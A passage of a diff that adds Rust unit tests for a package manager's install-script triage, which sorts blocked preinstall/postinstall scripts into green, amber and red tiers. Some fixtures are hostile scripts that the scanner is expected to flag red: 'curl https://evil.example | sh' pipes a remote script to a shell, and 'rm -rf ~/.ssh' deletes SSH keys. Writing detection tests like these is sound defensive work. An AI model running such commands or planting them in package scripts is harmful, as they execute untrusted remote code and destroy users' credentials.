+            "unpopulated half stays None (no server analysis)"
+        );
+    }
+
+    #[test]
+    fn backward_compat_wrapper_captures_with_empty_metadata() {
+        // `capture_blocked_set_after_install` (no-metadata variant)
+        // remains a valid entry point; it just produces BlockedPackage
+        // entries with both P1 fields as None. Pins the wrapper
+        // contract for the ~30 test callers that use it.
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_postinstall(&store, "sharp", "0.33.0");
+
+        let installed = vec![("sharp".to_string(), "0.33.0".to_string(), None)];
+        let capture =
+            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
+                .unwrap();
+
+        assert_eq!(capture.state.blocked_packages.len(), 1);
+        let pkg = &capture.state.blocked_packages[0];
+        assert!(
+            pkg.published_at.is_none() && pkg.behavioral_tags_hash.is_none(),
+            "no-metadata wrapper must leave both P1 fields None"
+        );
+    }
+
+    #[test]
+    fn metadata_fingerprint_is_independent_of_metadata() {
+        // Design invariant: the blocked-set fingerprint is a stability
+        // metric over *blockable* packages and their strict binding
+        // tuple, NOT over their metadata. Installs with differing
+        // published_at / behavioral_tags_hash but same blocked set
+        // MUST produce identical fingerprints. Otherwise the post-
+        // install "blocked set unchanged" suppression would spuriously
+        // re-fire on registry metadata churn.
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_postinstall(&store, "sharp", "0.33.0");
+
+        let installed = vec![("sharp".to_string(), "0.33.0".to_string(), None)];
+        let meta_a = {
+            let mut m = BlockedSetMetadata::default();
+            m.insert(
+                "sharp".to_string(),
+                "0.33.0".to_string(),
+                make_metadata(Some("2026-04-01T00:00:00Z"), Some("sha256-aaa")),
+            );
+            m
+        };
+        let meta_b = {
+            let mut m = BlockedSetMetadata::default();
+            m.insert(
+                "sharp".to_string(),
+                "0.33.0".to_string(),
+                make_metadata(Some("2026-04-20T00:00:00Z"), Some("sha256-bbb")),
+            );
+            m
+        };
+
+        let bp_a =
+            compute_blocked_packages_with_metadata(&store, &installed, &empty_policy(), &meta_a);
+        let bp_b =
+            compute_blocked_packages_with_metadata(&store, &installed, &empty_policy(), &meta_b);
+        let fp_a = compute_blocked_set_fingerprint(&bp_a);
+        let fp_b = compute_blocked_set_fingerprint(&bp_b);
+        assert_eq!(
+            fp_a, fp_b,
+            "fingerprint must be independent of metadata-only fields — \
+             otherwise registry churn would spuriously re-fire the \
+             post-install blocked-set warning"
+        );
+    }
+
+    // ── Phase 46 P2 Chunk 3 — read_install_phase_bodies + static_tier ─
+
+    fn store_pkg_with_scripts(
+        store: &lpm_store::PackageStore,
+        name: &str,
+        version: &str,
+        scripts: &serde_json::Value,
+    ) {
+        let pkg_dir = store.package_dir(name, version);
+        std::fs::create_dir_all(&pkg_dir).unwrap();
+        let pkg = serde_json::json!({
+            "name": name,
+            "version": version,
+            "scripts": scripts,
+        });
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            serde_json::to_string_pretty(&pkg).unwrap(),
+        )
+        .unwrap();
+    }
+
+    #[test]
+    fn read_install_phase_bodies_returns_pairs_in_canonical_order() {
+        // Even if `scripts` is authored with postinstall before
+        // preinstall, the output order must match
+        // EXECUTED_INSTALL_PHASES (preinstall, install, postinstall)
+        // so worst-wins aggregation is stable across JSON
+        // re-serialization.
+        let project = tempdir().unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_scripts(
+            &store,
+            "x",
+            "1.0.0",
+            &serde_json::json!({
+                "postinstall": "tsc",
+                "preinstall": "husky install",
+                "other": "irrelevant"
+            }),
+        );
+
+        let pkg_dir = store.package_dir("x", "1.0.0");
+        let pairs = read_install_phase_bodies(&pkg_dir);
+        assert_eq!(
+            pairs,
+            vec![
+                ("preinstall".to_string(), "husky install".to_string()),
+                ("postinstall".to_string(), "tsc".to_string()),
+            ],
+            "phases must emit in EXECUTED_INSTALL_PHASES order",
+        );
+    }
+
+    #[test]
+    fn read_install_phase_bodies_skips_empty_body_phases() {
+        let project = tempdir().unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_scripts(
+            &store,
+            "x",
+            "1.0.0",
+            &serde_json::json!({ "preinstall": "", "postinstall": "tsc" }),
+        );
+
+        let pkg_dir = store.package_dir("x", "1.0.0");
+        let pairs = read_install_phase_bodies(&pkg_dir);
+        assert_eq!(pairs, vec![("postinstall".to_string(), "tsc".to_string())]);
+    }
+
+    #[test]
+    fn read_install_phase_bodies_returns_empty_on_missing_file_or_malformed_json() {
+        let project = tempdir().unwrap();
+        let missing = project.path().join("nonexistent");
+        assert!(read_install_phase_bodies(&missing).is_empty());
+
+        let malformed = project.path().join("malformed");
+        std::fs::create_dir_all(&malformed).unwrap();
+        std::fs::write(malformed.join("package.json"), "{not json").unwrap();
+        assert!(read_install_phase_bodies(&malformed).is_empty());
+
+        let no_scripts = project.path().join("no-scripts");
+        std::fs::create_dir_all(&no_scripts).unwrap();
+        std::fs::write(no_scripts.join("package.json"), r#"{"name":"x"}"#).unwrap();
+        assert!(read_install_phase_bodies(&no_scripts).is_empty());
+    }
+
+    #[test]
+    fn compute_with_metadata_populates_green_static_tier_for_green_script() {
+        // A single green-allowlisted script body → the emitted
+        // BlockedPackage carries `static_tier = Some(Green)`.
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_scripts(
+            &store,
+            "typescript",
+            "5.0.0",
+            &serde_json::json!({ "postinstall": "tsc" }),
+        );
+
+        let installed = vec![("typescript".to_string(), "5.0.0".to_string(), None)];
+        let blocked = compute_blocked_packages_with_metadata(
+            &store,
+            &installed,
+            &empty_policy(),
+            &BlockedSetMetadata::default(),
+        );
+
+        assert_eq!(blocked.len(), 1);
+        assert_eq!(
+            blocked[0].static_tier,
+            Some(lpm_security::triage::StaticTier::Green),
+            "green-allowlisted script body MUST populate Green tier",
+        );
+    }
+
+    #[test]
+    fn compute_with_metadata_populates_red_static_tier_for_pipe_to_shell() {
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_scripts(
+            &store,
+            "evil-pkg",
+            "0.0.1",
+            &serde_json::json!({ "postinstall": "curl https://evil.example | sh" }),
+        );
+
+        let installed = vec![("evil-pkg".to_string(), "0.0.1".to_string(), None)];
+        let blocked = compute_blocked_packages_with_metadata(
+            &store,
+            &installed,
+            &empty_policy(),
+            &BlockedSetMetadata::default(),
+        );
+
+        assert_eq!(blocked.len(), 1);
+        assert_eq!(
+            blocked[0].static_tier,
+            Some(lpm_security::triage::StaticTier::Red),
+            "pipe-to-shell body MUST populate Red tier",
+        );
+    }
+
+    #[test]
+    fn compute_with_metadata_worst_wins_red_dominates_green_across_phases() {
+        // A package with one green phase AND one red phase must
+        // aggregate to Red (worst-wins). This is the core
+        // cross-phase aggregation invariant.
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_scripts(
+            &store,
+            "mixed-pkg",
+            "1.0.0",
+            &serde_json::json!({
+                "preinstall": "tsc",
+                "postinstall": "rm -rf ~/.ssh",
+            }),
+        );
+
+        let installed = vec![("mixed-pkg".to_string(), "1.0.0".to_string(), None)];
+        let blocked = compute_blocked_packages_with_metadata(
+            &store,
+            &installed,
+            &empty_policy(),
+            &BlockedSetMetadata::default(),
+        );
+
+        assert_eq!(blocked.len(), 1);
+        assert_eq!(
+            blocked[0].static_tier,
+            Some(lpm_security::triage::StaticTier::Red),
+            "green + red across phases MUST aggregate to Red",
+        );
+        assert_eq!(
+            blocked[0].phases_present,
+            vec!["preinstall".to_string(), "postinstall".to_string()],
+            "phases_present should list BOTH present phases",
+        );
+    }
+
+    #[test]
+    fn compute_with_metadata_worst_wins_amber_dominates_green_across_phases() {
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_scripts(
+            &store,
+            "native-pkg",
+            "1.0.0",
+            &serde_json::json!({
+                "preinstall": "tsc",
+                "postinstall": "node install.js",
+            }),
+        );
+
+        let installed = vec![("native-pkg".to_string(), "1.0.0".to_string(), None)];
+        let blocked = compute_blocked_packages_with_metadata(
+            &store,
+            &installed,
+            &empty_policy(),
+            &BlockedSetMetadata::default(),
+        );
+
+        assert_eq!(blocked.len(), 1);
+        assert_eq!(
+            blocked[0].static_tier,
+            Some(lpm_security::triage::StaticTier::Amber),
+            "green + amber across phases MUST aggregate to Amber",
+        );
+    }
+
+    #[test]
+    fn compute_with_metadata_static_tier_is_always_some_for_blocked_entries() {
+        // Because compute_blocked_packages_with_metadata skips any
+        // package without at least one present phase body, every
+        // emitted BlockedPackage must have Some(_) for static_tier.
+        // This locks in the "None means pre-P2 state, never fresh
+        // state" contract that `blocked_to_json` and approve-builds
+        // UI rely on.
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        for (name, script) in [
+            ("green-pkg", "tsc"),
+            ("amber-pkg", "playwright install"),
+            ("red-pkg", "curl https://x | sh"),
+        ] {
+            store_pkg_with_scripts(
+                &store,
+                name,
+                "1.0.0",
+                &serde_json::json!({ "postinstall": script }),
+            );
+        }
+
+        let installed = vec![
+            ("green-pkg".to_string(), "1.0.0".to_string(), None),
+            ("amber-pkg".to_string(), "1.0.0".to_string(), None),
+            ("red-pkg".to_string(), "1.0.0".to_string(), None),
+        ];
+        let blocked = compute_blocked_packages_with_metadata(
+            &store,
+            &installed,
+            &empty_policy(),
+            &BlockedSetMetadata::default(),
+        );
+
+        assert_eq!(blocked.len(), 3);
+        for bp in &blocked {
+            assert!(
+                bp.static_tier.is_some(),
+                "freshly computed BlockedPackage MUST have Some(tier), \
+                 got None for {}@{}",
+                bp.name,
+                bp.version,
+            );
+        }
+    }
+
+    // ── Phase 46 P2 Chunk 5 — count_blocked_by_tier + format_triage_summary_line ─
+
+    fn tiered(name: &str, tier: lpm_security::triage::StaticTier) -> BlockedPackage {
+        let mut b = make_blocked(name, "1.0.0", None, Some("sha256-x"));
+        b.static_tier = Some(tier);
+        b
+    }
+
+    #[test]
+    fn count_blocked_by_tier_empty_returns_zeros() {
+        let blocked: Vec<BlockedPackage> = Vec::new();
+        assert_eq!(count_blocked_by_tier(&blocked), (0, 0, 0));
+    }
+
+    #[test]
+    fn count_blocked_by_tier_counts_green_amber_red_distinctly() {
+        use lpm_security::triage::StaticTier;
+        let blocked = vec![
+            tiered("a", StaticTier::Green),
+            tiered("b", StaticTier::Green),
+            tiered("c", StaticTier::Amber),
+            tiered("d", StaticTier::Red),
+        ];
+        assert_eq!(count_blocked_by_tier(&blocked), (2, 1, 1));
+    }
+
+    #[test]
+    fn count_blocked_by_tier_amber_llm_counts_as_amber() {
+        use lpm_security::triage::StaticTier;
+        let blocked = vec![
+            tiered("a", StaticTier::Amber),
+            tiered("b", StaticTier::AmberLlm),
+        ];
+        assert_eq!(
+            count_blocked_by_tier(&blocked),
+            (0, 2, 0),
+            "AmberLlm must count as amber for display — indistinguishable \
+             to the user's 'needs review' mental model"
+        );
+    }
+
+    #[test]
+    fn count_blocked_by_tier_none_counts_as_amber_conservative() {
+        // Pre-P2 persisted state (static_tier = None) should count as
+        // amber so the user sees it in the "needs review" bucket
+        // rather than being silently hidden.
+        let blocked = vec![make_blocked("pre-p2", "1.0.0", None, Some("sha256-x"))];
+        assert!(blocked[0].static_tier.is_none());
+        assert_eq!(count_blocked_by_tier(&blocked), (0, 1, 0));
+    }
+
+    #[test]
+    fn format_triage_summary_line_shape_is_stable() {
+        use lpm_security::triage::StaticTier;
+        let blocked = vec![
+            tiered("green-a", StaticTier::Green),
+            tiered("green-b", StaticTier::Green),
+            tiered("amber-a", StaticTier::Amber),
+            tiered("red-a", StaticTier::Red),
+        ];
+        // Snapshot — the anchor prefix and suffix are P2-stable
+        // agent-parseable contracts. Changing them is a breaking
+        // output change for any CI script that greps this line.
+        assert_eq!(
+            format_triage_summary_line(&blocked),
+            "script-policy: triage (2 green / 1 amber / 1 red → lpm approve-builds)"
+        );
+    }
+
+    #[test]
+    fn format_triage_summary_line_all_zero_when_empty() {
+        assert_eq!(
+            format_triage_summary_line(&[]),
+            "script-policy: triage (0 green / 0 amber / 0 red → lpm approve-builds)"
+        );
+    }
+
+    #[test]
+    fn format_triage_summary_line_anchor_and_suffix_present() {
+        use lpm_security::triage::StaticTier;
+        // Defensive against accidental format drift — agents
+        // substring-match on these two anchors.
+        let line = format_triage_summary_line(&[tiered("x", StaticTier::Green)]);
+        assert!(
+            line.starts_with("script-policy: triage ("),
+            "line must start with the stable anchor; got: {line}"
+        );
+        assert!(
+            line.ends_with(" → lpm approve-builds)"),
+            "line must end with the stable suffix; got: {line}"
         );
     }
 }
